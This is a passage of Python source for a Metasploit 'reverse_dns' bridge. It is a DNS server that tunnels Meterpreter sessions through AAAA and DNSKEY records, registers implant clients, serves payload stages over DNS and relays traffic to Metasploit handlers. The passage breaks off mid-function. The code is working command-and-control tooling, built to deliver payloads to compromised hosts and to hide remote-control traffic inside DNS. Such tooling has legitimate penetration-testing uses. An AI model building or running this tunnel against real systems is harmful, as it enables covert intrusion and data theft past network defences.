#!/usr/bin/env python
# coding=utf-8

# MSF Bridge for reverse_dns transport
#
# Authors: Maxim Andreyanov, Alexey Sintsov
#

import argparse
import sys
import time
import threading
import SocketServer
import struct
import re
import ssl
import Queue
import base64
import logging
from logging.handlers import RotatingFileHandler
import socket
import select
from contextlib import contextmanager

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

DNS_LOG_NAME = "dns.log"
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
# add handler to the root logger
formatter = logging.Formatter("%(asctime)s %(name)-24s %(levelname)-8s %(message)s")
# rotating log file after 5 MB
handler = RotatingFileHandler(DNS_LOG_NAME, maxBytes=5*1024*1024, backupCount=5)
handler.setFormatter(formatter)
handler.setLevel(logging.DEBUG)
root_logger.addHandler(handler)

logger = logging.getLogger("dns_server")


def pack_byte_to_hn(val):
    """
    Pack byte to network order unsigned short
    """
    return (val << 8) & 0xffff


def pack_2byte_to_hn(low_byte, high_byte):
    """
    Pack 2 bytes to network order unsigned short
    """
    return ((low_byte << 8) | high_byte) & 0xffff


def pack_ushort_to_hn(val):
    """
    Pack unsigned short to network order unsigned short
    """
    return ((val & 0xff) << 8) | ((val & 0xff00) >> 8) & 0xffff


def xor_bytes(key, data):
    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


class Encoder(object):
    MAX_PACKET_SIZE = -1
    MIN_VAL_DOMAIN_SYMBOL = ord('a')
    MAX_VAL_DOMAIN_SYMBOL = ord('z')

    @staticmethod
    def get_next_sdomain(current_sdomain):

        def increment(lst, index):
            carry_flag = False
            val = lst[index]
            assert(val >= Encoder.MIN_VAL_DOMAIN_SYMBOL)
            if val >= Encoder.MAX_VAL_DOMAIN_SYMBOL:
                lst[index] = Encoder.MIN_VAL_DOMAIN_SYMBOL
                carry_flag = True
            else:
                lst[index] += 1
            return carry_flag

        lst = [ord(x) for x in reversed(current_sdomain)]
        for i, _ in enumerate(lst):
            if not increment(lst, i):
                break

        return ''.join([chr(x) for x in reversed(lst)])

    @staticmethod
    def encode_data_header(sub_domain, data_size):
        raise NotImplementedError()

    @staticmethod
    def encode_packet(packet_data):
        raise NotImplementedError()

    @staticmethod
    def encode_ready_receive():
        raise NotImplementedError()

    @staticmethod
    def encode_finish_send():
        raise NotImplementedError()

    @staticmethod
    def encode_send_more_data():
        raise NotImplementedError()

    @staticmethod
    def encode_registration(client_id, status):
        raise NotImplementedError()


class IPv6Encoder(Encoder):
    MAX_IPV6RR_NUM = 17
    MAX_DATA_IN_RR = 14
    MAX_PACKET_SIZE = MAX_IPV6RR_NUM * MAX_DATA_IN_RR
    IPV6_FORMAT = ":".join(["{:04x}"]*8)

    @staticmethod
    def _encode_nextdomain_datasize(next_domain, data_size):
        res = [0xfe81]
        for ch in next_domain:
            res.append(pack_byte_to_hn(ord(ch)))
        res.append(pack_2byte_to_hn(0 if data_size <= IPv6Encoder.MAX_PACKET_SIZE else 1, data_size & 0xff))
        res.append(pack_ushort_to_hn(data_size >> 8 & 0xffff))
        res.append(pack_byte_to_hn(data_size >> 24 & 0xff))
        return res

    @staticmethod
    def _encode_data_prefix(prefix, index, data):
        assert(len(data) <= IPv6Encoder.MAX_DATA_IN_RR)
        assert(index < IPv6Encoder.MAX_IPV6RR_NUM)
        res = []
        data_size = len(data)
        res.append(pack_2byte_to_hn(prefix, (index << 4 if index < 16 else 0) | data_size))
        for i in range(data_size//2):
            res.append(pack_2byte_to_hn(ord(data[i*2]), ord(data[i*2 + 1])))
        if data_size % 2 != 0:
            res.append(pack_byte_to_hn(ord(data[data_size-1])))
        return res

    @staticmethod
    def _align_hextets(hextests):
        l = len(hextests)
        if l < 8:
            hextests += [0] * (8-l)
        return hextests

    @staticmethod
    def hextets_to_str(hextets):
        return IPv6Encoder.IPV6_FORMAT.format(*IPv6Encoder._align_hextets(hextets))

    @staticmethod
    def encode_data_header(sub_domain, data_size):
        return [IPv6Encoder.hextets_to_str(IPv6Encoder._encode_nextdomain_datasize(sub_domain, data_size))]

    @staticmethod
    def encode_packet(packet_data):
        data_len = len(packet_data)
        if data_len > IPv6Encoder.MAX_PACKET_SIZE:
            raise ValueError("Data length is bigger than maximum packet size")
        block = []
        i = 0
        while i < data_len:
            next_i = min(i + IPv6Encoder.MAX_DATA_IN_RR, data_len)
            num_rr = i // IPv6Encoder.MAX_DATA_IN_RR
            is_last = (num_rr == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
            hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
                                                      num_rr, packet_data[i:next_i])
            block.append(IPv6Encoder.hextets_to_str(hextets))
            i = next_i
        return block

    @staticmethod
    def encode_ready_receive():
        return ["ffff:0000:0000:0000:0000:0000:0000:0000"]

    @staticmethod
    def encode_finish_send():
        return ["ffff:0000:0000:0000:0000:ff00:0000:0000"]

    @staticmethod
    def encode_send_more_data():
        return ["ffff:0000:0000:0000:0000:f000:0000:0000"]

    @staticmethod
    def encode_registration(client_id, status):
        return ["ffff:"+hex(ord(client_id))[2:4]+"00:0000:0000:0000:0000:0000:0000"]


class DNSKeyEncoder(Encoder):
    HEADER_SIZE = 4 + 3 # 4 bytes dnskey header, 1 byte for status, 2 for data length
    MAX_PACKET_SIZE = 16384
    ALGO = 253
    PROTOCOL = 3
    FLAGS = 257

    @staticmethod
    def _encode_to_dnskey(key=""):
        return DNSKEY(flags=DNSKeyEncoder.FLAGS, protocol=DNSKeyEncoder.PROTOCOL,
                      algorithm=DNSKeyEncoder.ALGO, key=key)

    @staticmethod
    def _encode_data(status=0, data=""):
        data_len = len(data)
        return struct.pack("<BH", status, data_len) + data

    @staticmethod
    def encode_data_header(sub_domain, data_size):
        key_data = struct.pack("4sI", sub_domain, data_size)
        key = DNSKeyEncoder._encode_data(data=key_data)
        return [DNSKeyEncoder._encode_to_dnskey(key)]

    @staticmethod
    def encode_packet(packet_data):
        data_len = len(packet_data)
        if data_len > DNSKeyEncoder.MAX_PACKET_SIZE:
            raise ValueError("Data length is bigger than maximum packet size")
        key = DNSKeyEncoder._encode_data(data=packet_data)
        return [DNSKeyEncoder._encode_to_dnskey(key)]

    @staticmethod
    def encode_ready_receive():
        key = DNSKeyEncoder._encode_data()
        return [DNSKeyEncoder._encode_to_dnskey(key)]

    @staticmethod
    def encode_finish_send():
        key = DNSKeyEncoder._encode_data(status=0x01)
        return [DNSKeyEncoder._encode_to_dnskey(key)]

    @staticmethod
    def encode_send_more_data():
        key = DNSKeyEncoder._encode_data(status=0x00)
        return [DNSKeyEncoder._encode_to_dnskey(key)]

    @staticmethod
    def encode_registration(client_id, status):
        key = DNSKeyEncoder._encode_data(status, client_id)
        return [DNSKeyEncoder._encode_to_dnskey(key)]


class NULLEncoder(Encoder):
    pass


class PartedData(object):
    def __init__(self, expected_size=0):
        self.expected_size = expected_size
        self.current_size = 0
        self.data = ""

    def reset(self, expected_size=0):
        self.expected_size = expected_size
        self.current_size = 0
        self.data = ""

    def add_part(self, data):
        data_len = len(data)
        if (self.current_size + data_len) > self.expected_size:
            raise ValueError("PartedData overflow")
        self.data += data
        self.current_size += data_len

    def is_complete(self):
        return self.expected_size == self.current_size

    def get_data(self):
        return self.data

    def get_expected_size(self):
        return self.expected_size

    def remain_size(self):
        return self.expected_size - self.current_size


class BlockSizedData(object):
    def __init__(self, data, block_size):
        self.data = data
        self.block_size = block_size
        self.data_size = len(self.data)

    def get_data(self, block_index):
        start_index = block_index * self.block_size
        if start_index >= self.data_size:
            raise IndexError("block index out of range")

        end_index = min(start_index + self.block_size, self.data_size)
        is_last = self.data_size == end_index
        return is_last, self.data[start_index:end_index]

    def get_size(self):
        return self.data_size


class Registrator(object):
    __instance = None
    CLIENT_TIMEOUT = 40

    @staticmethod
    def instance():
        if not Registrator.__instance:
            Registrator.__instance = Registrator()
        return Registrator.__instance

    def __init__(self):
        self.id_list = [chr(i) for i in range(ord('a'), ord('z')+1)]
        self.clientMap = {}
        self.servers = {}
        self.stagers = {}
        self.waited_servers = {}
        self.unregister_list = []
        self.lock = threading.Lock()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.default_stager = StageClient()
        self.timeout_service = TimeoutService(timeout=20)
        self.timeout_service.add_callback(self.on_timeout)

    def shutdown(self):
        self.timeout_service.remove_callback(self.on_timeout)

    def register_client_for_server(self, server_id, client):
        self.logger.info("Register client(%s) for server '%s'", client.get_id(), server_id)
        with self.lock:
            self.servers.setdefault(server_id, []).append(client)
        self._notify_waited_servers(server_id)

    def request_client_id(self, client):
        client_id = None
        with self.lock:
            try:
                client_id = self.id_list.pop(0)
                self.clientMap[client_id] = client
            except IndexError as e:
                self.logger.error("Can't find free id for new client.", exc_info=True)
                return None
        return client_id

    def _notify_waited_servers(self, server_id):
        notify_server = None
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                notify_server = waited_lst.pop(0)
                if not waited_lst:
                    del self.waited_servers[server_id]
        if notify_server:
            self.logger.info("Notify server(%s)", notify_server)
            notify_server.on_new_client()

    def subscribe(self, server_id, server):
        with self.lock:
            self.waited_servers.setdefault(server_id, []).append(server)
        self.logger.info("Subscription is done for server with %s id.", server_id)

    def unsubscribe(self, server_id, server):
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                with ignored(ValueError):
                    waited_lst.remove(server)
        self.logger.info("Unsubscription is done for server with %s id.", server_id)

    def get_client_by_id(self, client_id):
        with self.lock:
            with ignored(KeyError):
                return self.clientMap[client_id]

    def get_new_client_for_server(self, server_id):
        self.logger.info("Looking for clients...")
        with self.lock:
            with ignored(IndexError):
                clients = self.servers.get(server_id, [])
                assigned_client = clients.pop(0)
                if not clients:
                    del self.servers[server_id]
                return assigned_client

    def get_stage_client_for_server(self, server_id):
        with self.lock:
            try:
                return self.stagers[server_id]
            except KeyError:
                self.logger.info("Trying to request stager for server with %s id", server_id)
                waited_lst = self.waited_servers.get(server_id, [])
                if waited_lst:
                    server = waited_lst[0]
                    server.request_stage()
                else:
                    self.logger.info("Server list is empty")
                return self.default_stager

    def add_stager_for_server(self, server_id, data):
        with self.lock:
            self.stagers[server_id] = StageClient(data)

    def is_stager_server(self, server_id):
        with self.lock:
            return server_id in self.stagers

    def _unregister_client(self, client_id):
        with self.lock:
            with ignored(KeyError):
                del self.clientMap[client_id]
                self.id_list.append(client_id)
                self.logger.error("Unregister client with id %s successfully", client_id)

    def unregister_client(self, client_id, pending=True):
        if pending:
            with self.lock:
                self.unregister_list.append(client_id)
        else:
            self._unregister_client(client_id)

    def on_timeout(self, cur_time):
        disconnect_client_lst = []
        with self.lock:
            ids_for_remove = []
            for client_id, client in self.clientMap.iteritems():
                if abs(cur_time - client.ts) >= self.CLIENT_TIMEOUT:
                    ids_for_remove.append(client_id)
                    disconnect_client_lst.append(client)

            for client_id in ids_for_remove:
                del self.clientMap[client_id]
                self.id_list.append(client_id)
                self.logger.info("Unregister client with '%s' id(reason: timeout)", client_id)

            ids_for_remove = [server_id for server_id, client in self.stagers.iteritems()
                              if abs(client.ts - cur_time) >= self.CLIENT_TIMEOUT * 4]

            for server_id in ids_for_remove:
                waiters = self.waited_servers.get(server_id, [])
                if not waiters:
                    del self.stagers[server_id]
                    self.logger.info("Clearing stager client for server with '%s' id(reason: timeout)", server_id)

            unregister_list = []
            for client_id in self.unregister_list:
                client = self.clientMap.get(client_id, None)
                if client:
                    if client.is_idle():
                        del self.clientMap[client_id]
                        self.id_list.append(client_id)
                        self.logger.info("Unregister client with '%s' id", client_id)
                    else:
                        unregister_list.append(client_id)

            self.unregister_list = unregister_list
                    
        for client in disconnect_client_lst:
            if client.server_id:
                clients = self.servers.get(client.server_id, [])
                with ignored(ValueError):
                    clients.remove(client)
            client.on_timeout()


class TimeoutService(object):
    DEFAULT_TIMEOUT = 40

    def __init__(self, timeout=DEFAULT_TIMEOUT):
        self.timeout = timeout
        self.timer = None
        self.lock = threading.RLock()
        self.listeners = set()
        self.one_shot_listeners = set()

    def _setup_timer(self):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(self.timeout, self.timer_expired)
        self.timer.start()

    def _empty_listeners(self):
        return len(self.listeners) == 0 and len(self.one_shot_listeners) == 0

    def timer_expired(self):
        with self.lock:
            for listener in (self.listeners | self.one_shot_listeners):
                cur_time = int(time.time())
                listener(cur_time)
            self.one_shot_listeners = set()

            if not self._empty_listeners():
                self._setup_timer()
            else:
                self.timer.cancel()
                self.timer = None

    def add_callback(self, callback, one_shot=False):
        with self.lock:
            listeners = self.one_shot_listeners if one_shot else self.listeners
            no_listeners = self._empty_listeners()
            listeners.add(callback)
            if no_listeners:
                self._setup_timer()

    def remove_callback(self, callback):
        with self.lock:
            with ignored(KeyError):
                self.listeners.remove(callback)
            if self._empty_listeners() and self.timer is not None:
                self.timer.cancel()
                self.timer = None


class Client(object):
    INITIAL = 1
    INCOMING_DATA = 2

    def __init__(self):
        self.state = self.INITIAL
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.received_data = PartedData()
        self.last_received_index = -1
        self.sub_domain = "aaaa"
        self.send_data = None
        self.server_queue = Queue.Queue()
        self.client_queue = Queue.Queue()
        self.server = None
        self.client_id = None
        self.server_id = None
        self.register_for_server_needed = False
        self.ts = 0
        self.lock = threading.Lock()

    def update_last_request_ts(self):
        self.ts = int(time.time())

    def is_idle(self):
        with self.lock:
            # msf sends 2 packets after exit packet, but client doesn't request it
            # self.client_queue.empty() and \ 
            return not self.server and not self.received_data.is_complete() 

    def register_client(self, server_id, encoder):
        client_id = Registrator.instance().request_client_id(self)
        if client_id:
            self.client_id = client_id
            self.server_id = server_id
            self.register_for_server_needed = True
            self.logger.info("Registered new client with %s id for server_id %s", client_id, server_id)
            return encoder.encode_registration(client_id, 0)
        else:
            self.logger.info("Can't register client")
            return encoder.encode_finish_send()

    def get_id(self):
        return self.client_id

    def _setup_receive(self, exp_data_size, padding):
        self.state = self.INCOMING_DATA
        self.received_data.reset(exp_data_size)
        self.last_received_index = -1
        self.padding = padding

    def _initial_state(self):
        self.state = self.INITIAL
        self.received_data.reset()
        self.last_received_index = -1
        self.padding = 0

    def set_server(self, server):
        with self.lock:
            self.server = server

    def incoming_data_header(self, data_size, padding, encoder):
        if self.received_data.get_expected_size() == data_size and self.state == self.INCOMING_DATA:
            self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
            return encoder.encode_ready_receive()
        elif self.state == self.INCOMING_DATA:
            self.logger.error("Bad request. Client in the receiving data state")
            return None
        self.logger.info("Data header: waiting %d bytes of data", data_size)
        self._setup_receive(data_size, padding)
        return encoder.encode_ready_receive()

    def incoming_data(self, data, index, counter, encoder):
        self.logger.debug("Data %s, index %d", data, index)
        if self.state != self.INCOMING_DATA:
            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
            return encoder.encode_finish_send()

        data_size = len(data)
        if data_size == 0:
            self.logger.error("Empty incoming data. Send finish.")
            return encoder.encode_finish_send()

        if self.last_received_index >= index:
            self.logger.info("Duplicated packet.")
            return encoder.encode_send_more_data()

        try:
            self.received_data.add_part(data)
        except ValueError:
            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
            self._initial_state()
            return encoder.encode_finish_send()

        self.last_received_index = index
        if self.received_data.is_complete():
            self.logger.info("All expected data is received")
            try:
                packet = base64.b32decode(self.received_data.get_data() + "=" * self.padding, True)
                self.logger.info("Put decoded data to the server queue")
                self.server_queue.put(packet)
                self._initial_state()
                if self.server:
                    self.logger.info("Notify server")
                    self.server.polling()
            except Exception:
                self.logger.error("Error during decode received data", exc_info=True)
                self._initial_state()
                return encoder.encode_finish_send()
        return encoder.encode_send_more_data()

    def request_data_header(self, sub_domain, encoder):
        if sub_domain == self.sub_domain:
            if self.register_for_server_needed:
                Registrator.instance().register_client_for_server(self.server_id, self)
                self.register_for_server_needed = False

            if not self.send_data:
                with ignored(Queue.Empty):
                    self.logger.info("Checking client queue...")
                    data = self.client_queue.get_nowait()
                    self.send_data = BlockSizedData(data, encoder.MAX_PACKET_SIZE)
                    self.logger.debug("New data found: size is %d", len(data))

            data_size = 0
            if self.send_data:
                next_sub = encoder.get_next_sdomain(self.sub_domain)
                sub_domain = next_sub
                data_size = self.send_data.get_size()
            else:
                self.logger.info("No data for client.(%s)", "server" if self.server else "no server")
            self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
            return encoder.encode_data_header(sub_domain, data_size)
        else:
            self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
            if sub_domain == "aaaa":
                self.logger.info("MIGRATION.")
            self.sub_domain = sub_domain
            self.send_data = None

    def request_data(self, sub_domain, index, encoder):
        self.logger.debug("request_data - %s, %d", sub_domain, index)
        if sub_domain != self.sub_domain:
            self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
            return None

        if not self.send_data:
            self.logger.error("Bad request. There are no data.")
            return None

        try:
            _, data = self.send_data.get_data(index)
            self.logger.debug("request_data: return data %s", data)
            return encoder.encode_packet(data)
        except ValueError:
            self.logger.error("request_data: index(%d) out of range.", index)

    def server_put_data(self, data):
        self.logger.info("Server adds data to queue.")
        self.client_queue.put(data)

    def server_get_data(self, timeout=2):
        self.logger.info("Checking server queue...")
        with ignored(Queue.Empty):
            data = self.server_queue.get(True, timeout)
            self.logger.info("There are new data(length=%d) for the server", len(data))
            return data

    def server_has_data(self):
        return not self.server_queue.empty()

    def on_timeout(self):
        if self.server:
            self.server.on_client_timeout()
            self.server = None


class StageClient(object):
    subdomain = '7812'

    def __init__(self, data=None):
        self.stage_data = data
        self.data_len = len(data) if data else 0
        self.encoder_data = {}
        self.ts = 0

    def update_last_request_ts(self):
        self.ts = int(time.time())

    def request_data_header(self, encoder):
        return encoder.encode_data_header(self.subdomain, self.data_len)

    def request_data(self, index, encoder):
        if not self.stage_data:
            return encoder.encode_finish_send()
        
        send_data = self.encoder_data.get(encoder, None)
        if not send_data:
            send_data = BlockSizedData(self.stage_data, encoder.MAX_PACKET_SIZE)
            self.encoder_data[encoder] = send_data
        _, data = send_data.get_data(index)
        return encoder.encode_packet(data)


class Request(object):
    EXPR = None
    OPTIONS = []
    LOGGER = logging.getLogger("Request")

    @classmethod
    def match(cls, qname):
        if cls.EXPR:
            return cls.EXPR.match(qname)

    @classmethod
    def handle(cls, qname, dns_cls):
        m = cls.match(qname)
        if not m:
            return None
        params = m.groupdict()
        client = None
        client_id = params.pop("client", None)
        if not client_id:
            if "new_client" in cls.OPTIONS:
                Request.LOGGER.info("Create a new client.")
                client = Client()
        else:
            client = Registrator.instance().get_stage_client_for_server(client_id) if "stage_client" in cls.OPTIONS else \
                     Registrator.instance().get_client_by_id(client_id)

        if client:
            Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
            client.update_last_request_ts()
            params["encoder"] = dns_cls.encoder
            return cls._handle_client(client, **params)
        else:
            Request.LOGGER.error("Can't find client with name %s", client_id)

    @classmethod
    def _handle_client(cls, client, **kwargs):
        raise NotImplementedError()


class GetDataHeader(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = kwargs['sub_dom']
        encoder = kwargs['encoder']
        return client.request_data_header(sub_domain, encoder)


class GetStageHeader(Request):
    EXPR = re.compile(r"7812\.000g\.(?P<rnd>\d+)\.0\.(?P<client>\w+)")
    OPTIONS = ["stage_client"]

    @classmethod
    def _handle_client(cls, client, **kwargs):
        encoder = kwargs['encoder']
        return client.request_data_header(encoder)


class GetDataRequest(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = kwargs['sub_dom']
        index = int(kwargs['index'])
        encoder = kwargs['encoder']
        return client.request_data(sub_domain, index, encoder)


class GetStageRequest(Request):
    EXPR = re.compile(r"7812\.(?P<index>\d+)\.(?P<rnd>\d+)\.0\.(?P<client>\w+)")
    OPTIONS = ["stage_client"]

    @classmethod
    def _handle_client(cls, client, **kwargs):
        index = int(kwargs['index'])
        encoder = kwargs['encoder']
        return client.request_data(index, encoder)


class IncomingDataRequest(Request):
    EXPR = re.compile(r"t\.(?P<base64>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        enc_data = kwargs['base64']
        counter = int(kwargs['cnt'])
        index = int(kwargs['idx'])
        encoder = kwargs['encoder']
        enc_data = re.sub(r"\.", "", enc_data)
        return client.incoming_data(enc_data, index, counter, encoder)


class IncomingDataHeaderRequest(Request):
    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        size = int(kwargs['size'])
        padding = int(kwargs['padd'])
        encoder = kwargs['encoder']
        return client.incoming_data_header(size, padding, encoder)


class IncomingNewClient(Request):
    EXPR = re.compile(r"7812\.reg0\.\d+\.(?P<server_id>\w+)")
    OPTIONS = ["new_client"]

    @classmethod
    def _handle_client(cls, client, **kwargs):
        return client.register_client(kwargs['server_id'], kwargs['encoder'])


class DNSTunnelRequestHandler(object):
    encoder = IPv6Encoder

    def __init__(self, domain):
        self.domain = domain
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.handlers_chain = [
            GetStageHeader,
            GetStageRequest,
            IncomingDataHeaderRequest,
            IncomingDataRequest,
            GetDataRequest,
            GetDataHeader,
            IncomingNewClient
        ]

    def process_request(self, reply, qname):
        # cut domain from requested qname
        i = qname.rfind("." + self.domain)
        if i == -1:
            self.logger.error("Bad request: can't find domain %s in %s", self.domain, qname)
            return
        sub_domain = qname[:i]
        self.logger.info("requested subdomain name is %s", sub_domain)
        for handler in self.handlers_chain:
            answer = handler.handle(sub_domain, self.__class__)
            if not answer:
                continue
            for rr in answer:
                self.logger.debug("Add resource record to the reply %s", rr)
                self.process_rr(qname, rr, reply)
            break
        else:
            self.logger.error("Request with subdomain %s doesn't handled", qname)

    def process_rr(self, qname, rr, reply):
        raise NotImplementedError()


class AAAARequestHandler(DNSTunnelRequestHandler):
    encoder = IPv6Encoder

    def process_rr(self, qname, rr, reply):
        reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, rclass=1, ttl=1,
                            rdata=AAAA(rr)))

class DNSKeyRequestHandler(DNSTunnelRequestHandler):
     encoder = DNSKeyEncoder

     def process_rr(self, qname, rr, reply):
         reply.add_answer(RR(rname=qname, rtype=QTYPE.DNSKEY, rclass=1, ttl=1,
                             rdata=rr))


class NULLRequestHandler(DNSTunnelRequestHandler):
    encoder = NULLEncoder

    def process_rr(self, qname, rr, reply):
        pass
        # dnslib doesn't support NULL resource records
        #reply.add_answer(RR(rname=qname, rtype=QTYPE.NULL, rclass=1, ttl=1,
        #                    rdata=DNSNULL(rr)))

class DnsServer(object):
    __instance = None

    @staticmethod
    def create(domain, ipv4, ns_servers):
        if not DnsServer.__instance:
            DnsServer.__instance = DnsServer(domain, ipv4, ns_servers)

    @staticmethod
    def instance():
        return DnsServer.__instance

    def __init__(self, domain, ipv4, ns_servers):
        self.domain = domain + "."
        self.ipv4 = ipv4
        self.ns_servers = ns_servers
        self.logger = logging.getLogger(self.__class__.__name__)
        self.handlers = {
            QTYPE.NS: self._process_ns_request,
            QTYPE.A: self._process_a_request,
            QTYPE.AAAA: self._process_aaaa_request,
            QTYPE.DNSKEY: self._process_dnskey_request
        }
        self.aaaa_handler = AAAARequestHandler(self.domain)
        self.dnskey_handler = DNSKeyRequestHandler(self.domain)

    def process_request(self, request, transport):
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qn = str(request.q.qname)
        qtype = request.q.qtype
        qt = QTYPE[qtype]
        if qn.endswith(self.domain):
            try:
                self.logger.info("Process request for type %s", qt)
                self.handlers[qtype](reply, qn)
            except KeyError as e:
                self.logger.info("%s request type is not supported", qt)
        else:
            self.logger.info("DNS request for domain %s is not handled by this server. Sending empty answer.", qn)
        self.logger.info("Send reply for DNS request")
        self.logger.debug("Reply data: %s", reply)
        answer = reply.pack()
        if (len(answer) > 575) and (transport == BaseRequestHandlerDNS.TRANSPORT_UDP):
            # send truncate flag
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1, tc=1), q=request.q)
            answer = reply.pack()
        return answer

    def _process_ns_request(self, reply, qname):
        for server in self.ns_servers:
            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=1, rdata=server))

    def _process_a_request(self, reply, qname):
        self.logger.info("Send answer for A request - %s", self.ipv4)
        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=1, rdata=A(self.ipv4)))

    def _process_aaaa_request(self, reply, qname):
        if self.aaaa_handler:
            self.aaaa_handler.process_request(reply, qname)

    def _process_dnskey_request(self, reply, qname):
        if self.dnskey_handler:
            self.dnskey_handler.process_request(reply, qname)


def dns_response(data, transport):
    try:
        request = DNSRecord.parse(data)
        dns_server = DnsServer.instance()
        if dns_server:
            return dns_server.process_request(request, transport)
        else:
            logger.error("Can't get dns server instance.")
    except Exception as e:
        logger.error("Exception during handle request " + str(e), exc_info=True)


class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
    TRANSPORT_UDP = 1
    TRANSPORT_TCP = 2
    TRANSPORT = TRANSPORT_UDP

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        logger.info("DNS request %s (%s %s):", self.__class__.__name__[:3], self.client_address[0],
                    self.client_address[1])
        try:
            data = self.get_data()
            logger.debug("Size:%d, data %s", len(data), data)
            dns_ans = dns_response(data, self.TRANSPORT)
            if dns_ans:
                self.send_data(dns_ans)
        except Exception:
            logger.error("Exception in request handler.", exc_info=True)


class PartedDataReader(object):
    INITIAL = 1
    RECEIVING_DATA = 2

    def __init__(self, read_func, header_func=None, completion_func=None,
                 continue_func=None, init_data=None):
        self.read_func = read_func
        self.header_func = header_func
        self.completion_func = completion_func
        self.continue_func = continue_func
        self.state = PartedDataReader.INITIAL
        self.header = ""
        self.data = init_data

    def read(self):
        if self.state == PartedDataReader.INITIAL:
            data_size, data = self.header_func(self.header)
            if data_size == 0:
                return
            elif data_size == -1:
                self.header = data
                return
            self.header = ""
            self.state = PartedDataReader.RECEIVING_DATA
            self.data = PartedData(data_size)
            if data:
                self.data.add_part(data)
        data = self.read_func(self.data.remain_size())
        if not data:
            return
        self.data.add_part(data)
        if self.data.is_complete():
            if self.completion_func:
                self.completion_func(self.data)
            self.data = None
            self.state = PartedDataReader.INITIAL
        elif self.continue_func:
            self.continue_func()


class MSFClient(object):
    HEADER_SIZE = 32
    LOGGER = logging.getLogger("MSFClient")

    def __init__(self, sock, server):
        # enable keep-alive every minute
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 60)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 4)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 15)
        sock.setblocking(False)
        self.sock = sock
        self.server = server
        self.msf_id = ""
        self.client = None
        self.wait_client = False
        self.stage_requested = False
        self.lock = threading.Lock()
        self.client_event = threading.Event()
        self.parted_reader = None
        self._setup_id_reader()

    def get_socket(self):
        return self.sock if not self.wait_client else None

    def _on_closing_connection(self):
        if self.client:
            client_id = self.client.get_id()
            if client_id:
                MSFClient.LOGGER.info("Unregister client with id %s", client_id)
                Registrator.instance().unregister_client(client_id)
            self.client.set_server(None)
            self.client = None
        Registrator.instance().unsubscribe(self.msf_id, self)
        self.close()
        self.server.remove_me(self)

    def _read_data(self, size):
        data = None
        try:
            data = self.sock.recv(size)
            if not data:
                MSFClient.LOGGER.info("Connection closed by msf")
                self._on_closing_connection()
                return None
            return data
        except:
            # connection closed
            MSFClient.LOGGER.error("Exception during read. Closing connection.", exc_info=True)
            self._on_closing_connection()
            return None

    def on_new_client(self):
        with self.lock:
            if not self.client:
                if self._setup_client():
                    self._setup_status_request_reader()
                    Registrator.instance().unsubscribe(self.msf_id, self)
                    self.wait_client = False
                    self.polling()
            else:
                self.LOGGER.error("Client already exists for this server")

    def request_stage(self):
        with self.lock:
            if not self.stage_requested:
                self._setup_stage_reader()
                self.stage_requested = True
                self.wait_client = False
                self.polling()
            else:
                MSFClient.LOGGER.info("Stage has already was requested on this server")

    def _setup_id_reader(self):
        self.parted_reader = PartedDataReader(read_func=self._read_data,
                                              header_func=self._read_id_header,
                                              completion_func=self._read_id_complete
                                              )

    def _setup_tlv_reader(self):
        self.parted_reader = PartedDataReader(read_func=self._read_data,
                                              header_func=self._read_tlv_header,
                                              completion_func=self._read_tlv_complete
                                              )

    def _setup_stage_reader(self, without_data=False):
        self.parted_reader = PartedDataReader(read_func=self._read_data,
                                              header_func=self._read_stage_header,
                                              completion_func=self._read_stage_complete_data_drop if without_data else
                                                              self._read_stage_complete
                                              )
    
    def _setup_status_request_reader(self):
        self.parted_reader = PartedDataReader(read_func=self._read_data,
                                              header_func=self._read_status_request,
                                              completion_func=self._read_status_complete
                                              )

    def _read_id_header(self, data):
